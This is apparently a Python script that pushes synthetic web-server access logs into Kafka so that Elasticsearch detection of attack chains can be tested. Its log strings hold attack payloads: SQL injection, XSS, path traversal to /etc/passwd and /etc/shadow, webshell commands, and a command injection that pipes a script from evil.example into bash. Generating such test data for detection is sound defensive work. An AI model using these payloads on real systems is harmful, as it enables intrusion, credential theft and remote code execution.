from kafka import KafkaProducer
import time
from datetime import datetime, timezone
import random
from urllib.parse import quote

producer = KafkaProducer(
    bootstrap_servers='localhost:29092'
)

TOPIC = "log.raw"

# =========================
# 固定角色 IP：方便 ES 聚合
# =========================
NORMAL_IPS = [
    "192.168.1.101",
    "10.0.0.5",
    "172.16.0.3"
]

LOW_RISK_IP = "39.144.100.52"        # 偶发扫描、单次攻击
MEDIUM_RISK_IP = "185.199.108.10"    # 持续扫描、SQLi、爆破
HIGH_RISK_IP = "45.77.88.99"         # 攻击成功 / WebShell / 命令执行

NORMAL_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

SUSPICIOUS_UA = [
    "sqlmap/1.8.3#stable",
    "Nikto/2.5.0",
    "curl/7.68.0",
    "Python-urllib/3.11",
    "masscan/1.3"
]

# =========================
# 通用日志格式
# =========================
def build_log(ip, url, status, size, user_agent, method="GET"):
    now = datetime.now(timezone.utc)
    timestamp_str = now.strftime('%d/%b/%Y:%H:%M:%S %z')

    return (
        f'{ip} - - [{timestamp_str}] '
        f'"{method} {url} HTTP/1.1" '
        f'{status} {size} "-" "{user_agent}"'
    )

# =========================
# 低危：单次、偶发、无连续性
# =========================
def generate_low_risk_log():
    scenarios = [
        ("/robots.txt", 200, 300, "Googlebot/2.1 (+http://www.google.com/bot.html)"),
        ("/wp-login.php", 404, 512, "curl/7.68.0"),
        ("/phpmyadmin/", 404, 512, "Mozilla/5.0"),
        ("/search?q=<script>alert(1)</script>", 403, 420, "Mozilla/5.0"),
        ("/login?username=admin' OR '1'='1&password=123", 403, 380, "curl/7.68.0"),
        ("/api/data?filter=../../etc/passwd", 403, 410, "Python-urllib/3.11"),
    ]

    url, status, size, ua = random.choice(scenarios)
    return build_log(LOW_RISK_IP, url, status, size, ua)

# =========================
# 正常访问
# =========================
def generate_normal_log():
    ip = random.choice(NORMAL_IPS)

    scenarios = [
        ("/index", 200, random.randint(1200, 3500)),
        ("/about", 200, random.randint(800, 2000)),
        ("/products?id=23", 200, random.randint(1500, 4500)),
        ("/contact", 200, random.randint(800, 1600)),
        ("/products?id=42", 301, 0),
        ("/assets/logo.png", 200, random.randint(5000, 15000)),
    ]

    url, status, size = random.choice(scenarios)
    return build_log(ip, url, status, size, random.choice(NORMAL_UA))

# =========================
# 中危：持续扫描 / SQLi / 爆破
# =========================
medium_attack_queue = []

def refill_medium_attack_queue():
    global medium_attack_queue

    attack_chain = random.choice([
        "scanner",
        "sqli",
        "brute_force",
        "sensitive_probe"
    ])

    if attack_chain == "scanner":
        paths = [
            "/admin",
            "/admin/login",
            "/wp-admin",
            "/phpmyadmin/",
            "/.env",
            "/backup.zip",
            "/config.php",
            "/server-status",
            "/actuator/health",
        ]

        medium_attack_queue = [
            build_log(
                MEDIUM_RISK_IP,
                path,
                random.choice([403, 404, 404, 200]),
                random.randint(200, 1000),
                "Nikto/2.5.0"
            )
            for path in paths
        ]

    elif attack_chain == "sqli":
        payloads = [
            "/login?username=admin' OR '1'='1&password=x",
            "/products?id=1' UNION SELECT username,password FROM users--",
            "/api/user?id=1 AND SLEEP(3)--",
            "/search?q=' OR 1=1--",
            "/article?id=1%20AND%20(SELECT%20COUNT(*)%20FROM%20users)>0",
        ]

        medium_attack_queue = [
            build_log(
                MEDIUM_RISK_IP,
                url,
                random.choice([403, 500, 500, 200]),
                random.randint(300, 1200),
                "sqlmap/1.8.3#stable"
            )
            for url in payloads
            for _ in range(random.randint(2, 4))
        ]

    elif attack_chain == "brute_force":
        medium_attack_queue = [
            build_log(
                MEDIUM_RISK_IP,
                f"/login?username=admin&password=guess{index}",
                401,
                random.randint(200, 500),
                "Python-urllib/3.11",
                method="POST"
            )
            for index in range(1, 16)
        ]

    elif attack_chain == "sensitive_probe":
        paths = [
            "/.git/config",
            "/.env",
            "/config/database.yml",
            "/backup.sql",
            "/database.sql",
            "/etc/passwd",
            "/api/internal/users",
        ]

        medium_attack_queue = [
            build_log(
                MEDIUM_RISK_IP,
                path,
                random.choice([403, 404, 500]),
                random.randint(200, 900),
                "curl/7.68.0"
            )
            for path in paths
            for _ in range(2)
        ]

def generate_medium_risk_log():
    global medium_attack_queue

    if not medium_attack_queue:
        refill_medium_attack_queue()

    return medium_attack_queue.pop(0)

# =========================
# 高危：攻击成功、完整攻击链
# =========================
high_attack_queue = []

def refill_high_attack_queue():
    global high_attack_queue

    attack_chain = random.choice([
        "successful_brute_force",
        "webshell",
        "path_traversal_success",
        "command_execution",
        "service_disruption"
    ])

    if attack_chain == "successful_brute_force":
        # 多次失败 + 最后成功 + 进入后台
        high_attack_queue = [
            build_log(
                HIGH_RISK_IP,
                f"/login?username=admin&password=test{index}",
                401,
                300,
                "Python-urllib/3.11",
                method="POST"
            )
            for index in range(1, 10)
        ]

        high_attack_queue += [
            build_log(
                HIGH_RISK_IP,
                "/login?username=admin&password=Admin@123456",
                200,
                1500,
                "Python-urllib/3.11",
                method="POST"
            ),
            build_log(
                HIGH_RISK_IP,
                "/admin/dashboard",
                200,
                8200,
                "Python-urllib/3.11"
            ),
            build_log(
                HIGH_RISK_IP,
                "/admin/users",
                200,
                12500,
                "Python-urllib/3.11"
            ),
            build_log(
                HIGH_RISK_IP,
                "/admin/export?type=users",
                200,
                50000,
                "Python-urllib/3.11"
            ),
        ]

    elif attack_chain == "webshell":
        high_attack_queue = [
            build_log(
                HIGH_RISK_IP,
                "/upload",
                200,
                850,
                "curl/7.68.0",
                method="POST"
            ),
            build_log(
                HIGH_RISK_IP,
                "/uploads/shell.php",
                200,
                1200,
                "curl/7.68.0"
            ),
            build_log(
                HIGH_RISK_IP,
                "/uploads/shell.php?cmd=id",
                200,
                250,
                "curl/7.68.0"
            ),
            build_log(
                HIGH_RISK_IP,
                "/uploads/shell.php?cmd=whoami",
                200,
                250,
                "curl/7.68.0"
            ),
            build_log(
                HIGH_RISK_IP,
                "/uploads/shell.php?cmd=cat+/etc/passwd",
                200,
                3200,
                "curl/7.68.0"
            ),
        ]

    elif attack_chain == "path_traversal_success":
        high_attack_queue = [
            build_log(
                HIGH_RISK_IP,
                "/api/download?file=../../../../etc/passwd",
                200,
                2800,
                "curl/7.68.0"
            ),
            build_log(
                HIGH_RISK_IP,
                "/api/download?file=../../../../etc/shadow",
                200,
                1900,
                "curl/7.68.0"
            ),
            build_log(
                HIGH_RISK_IP,
                "/api/download?file=../../../../app/.env",
                200,
                900,
                "curl/7.68.0"
            ),
        ]

    elif attack_chain == "command_execution":
        high_attack_queue = [
            build_log(
                HIGH_RISK_IP,
                "/api/ping?host=127.0.0.1;id",
                500,
                600,
                "sqlmap/1.8.3#stable"
            ),
            build_log(
                HIGH_RISK_IP,
                "/api/ping?host=127.0.0.1;whoami",
                200,
                700,
                "sqlmap/1.8.3#stable"
            ),
            build_log(
                HIGH_RISK_IP,
                "/api/ping?host=127.0.0.1;cat+/etc/passwd",
                200,
                3200,
                "sqlmap/1.8.3#stable"
            ),
            build_log(
                HIGH_RISK_IP,
                "/api/ping?host=127.0.0.1;curl+http://evil.example/shell.sh|bash",
                200,
                1200,
                "sqlmap/1.8.3#stable"
            ),
        ]

    elif attack_chain == "service_disruption":
        high_attack_queue = [
            build_log(
                HIGH_RISK_IP,
                f"/api/search?q={'A' * 2000}",
                500,
                300,
                "masscan/1.3"
            )
            for _ in range(15)
        ]

        high_attack_queue += [
            build_log(
                HIGH_RISK_IP,
                "/api/health",
                500,
                200,
                "masscan/1.3"
            )
            for _ in range(5)
        ]

def generate_high_risk_log():
    global high_attack_queue

    if not high_attack_queue:
        refill_high_attack_queue()

    return high_attack_queue.pop(0)

# =========================
# 主循环
# =========================
while True:
    # 正常日志仍然最多，但攻击日志会按“连续攻击链”发送
    log_type = random.choices(
        ["normal", "low", "medium", "high"],
        weights=[45, 15, 25, 15],
        k=1
    )[0]

    if log_type == "normal":
        log = generate_normal_log()
    elif log_type == "low":
        log = generate_low_risk_log()
    elif log_type == "medium":
        log = generate_medium_risk_log()
    else:
        log = generate_high_risk_log()

    producer.send(TOPIC, log.encode("utf-8"))
    producer.flush()

    print(f"[{log_type.upper()}] sent: {log}")

    # 攻击链要更密集，才能让你的 5 分钟 / 10 分钟 ES 聚合识别出来
    if log_type in ["medium", "high"]:
        time.sleep(random.uniform(0.2, 0.7))
    else:
        time.sleep(random.uniform(1.0, 2.5))